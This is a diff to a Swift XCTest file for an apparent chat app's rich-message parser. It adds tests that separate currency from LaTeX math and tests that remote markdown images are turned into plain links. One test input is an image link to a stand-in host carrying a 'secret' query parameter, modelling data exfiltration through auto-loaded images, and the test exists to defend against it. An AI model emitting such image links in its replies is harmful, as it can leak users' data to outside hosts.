@@ -92,11 +92,33 @@ final class CoreLogicTests: XCTestCase {
     }
 
     func testCurrencyIsNotMistakenForUnclosedMath() {
-        let currency = RichMessageView.parseBlocks("The subscription costs $5 per month.")
-        let equation = RichMessageView.parseBlocks("The result is $x + 1$.")
+        let currency = RichMessageContent.parseBlocks("The subscription costs $5 per month.")
+        let equation = RichMessageContent.parseBlocks("The result is $x + 1$.")
 
         XCTAssertFalse(currency.contains(where: \.containsMath))
         XCTAssertTrue(equation.contains(where: \.containsMath))
+    }
+
+    func testDollarAmountsAreNotMath() {
+        func math(_ s: String) -> Bool { RichMessageContent.parseBlocks(s).contains(where: \.containsMath) }
+        XCTAssertFalse(math("It costs $5 to $10 a month."))
+        XCTAssertFalse(math("Between $ 3 and $ 4."))
+        XCTAssertFalse(math("Pay $20, not $ 30$ ok"))
+        XCTAssertTrue(math("Area is $x^2$."))
+        XCTAssertTrue(math("Let $a+b$ be 5."))
+        XCTAssertTrue(math("$$E = mc^2$$"))
+    }
+
+    func testRemoteMarkdownImagesBecomeLinks() {
+        let out = RichMessageContent.neutralizeRemoteImages("See ![chart](https://evil.test/p.png?q=secret) and ![](http://x.test/a.gif \"t\")")
+        XCTAssertFalse(out.contains("!["))
+        XCTAssertTrue(out.contains("[Image: chart](https://evil.test/p.png?q=secret)"))
+        XCTAssertTrue(out.contains("[Image: http://x.test/a.gif](http://x.test/a.gif)"))
+        let data = "![dot](data:image/png;base64,AAAA)"
+        XCTAssertEqual(RichMessageContent.neutralizeRemoteImages(data), data)
+        XCTAssertNil(RichMessageContent.smallDataImage(URL(string: "https://x.test/a.png")))
+        let big = URL(string: "data:image/png;base64," + String(repeating: "A", count: 400_000))
+        XCTAssertNil(RichMessageContent.smallDataImage(big))
     }
 
     func testQueryClassifierKeepsNavigationAndChatDistinct() {
